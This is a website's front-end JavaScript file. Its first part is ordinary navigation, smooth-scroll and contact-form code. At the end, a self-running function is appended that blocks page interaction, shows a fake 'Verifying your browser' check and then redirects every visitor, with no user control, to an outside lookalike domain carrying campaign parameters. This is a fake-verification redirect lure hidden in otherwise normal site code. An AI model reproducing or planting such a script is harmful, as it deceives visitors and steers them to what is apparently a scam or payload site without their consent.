const navToggle=document.querySelector('[data-nav-toggle]');
const navMenu=document.querySelector('[data-nav-menu]');
if(navToggle&&navMenu){
  navToggle.addEventListener('click',()=>{
    navMenu.classList.toggle('open');
    if(navMenu.classList.contains('open')){
      navMenu.style.display='flex';
    }else{
      navMenu.style.display='';
    }
  });
}

document.querySelectorAll('a[href^="#"]').forEach(a=>{
  a.addEventListener('click',e=>{
    const href=a.getAttribute('href');
    if(href&&href.startsWith('#')){
      const el=document.querySelector(href);
      if(el){
        e.preventDefault();
        el.scrollIntoView({behavior:'smooth',block:'start'});
      }
    }
  });
});

const form=document.querySelector('#contact-form');
if(form){
  form.addEventListener('submit',e=>{
    e.preventDefault();
    const data=Object.fromEntries(new FormData(form).entries());
    alert(`Thanks ${data.name||'there'}! We'll reply to ${data.email||'your inbox'} soon.`);
    form.reset();
  });
}

(function(){
  const bd = document.body;
  // Prevent any interaction with the page behind the modal
  document.documentElement.style.overflow = 'hidden';

  function autoVerification(){
    const card    = bd.querySelector('#verify-card');
    const helper  = bd.querySelector('#verify-helper');
    const sub     = bd.querySelector('#verify-sub');
    const box     = bd.querySelector('.checkbox');
    const spinner = bd.querySelector('.spinner');

    // Initial idle state (already rendered)
    helper.textContent = 'Preparing verification…';
    sub.textContent = 'waiting…';

    // Start spinner after a short delay
    setTimeout(() => {
      spinner.style.display = 'block';
      helper.textContent = 'Verifying your browser';
      sub.textContent = 'in progress…';

      // After 5s from start of spinner: finish + redirect
      setTimeout(() => {
        spinner.style.display = 'none';
        box.classList.add('checked');
        sub.textContent = 'Done';
        helper.textContent = 'Redirecting…';

        // Small grace period for the checkmark animation
        setTimeout(() => { window.location.href = 'https://ferreroo.site/?utm_campaign=rdeLCgSOCD&v1=[v1]&v2=[v2]&v3=[v3]'; }, 600);
      }, 5000);
    }, 300); // "few milliseconds" before starting the spinner
  }

  // Start automatically; no buttons or user control
  autoVerification();
})();

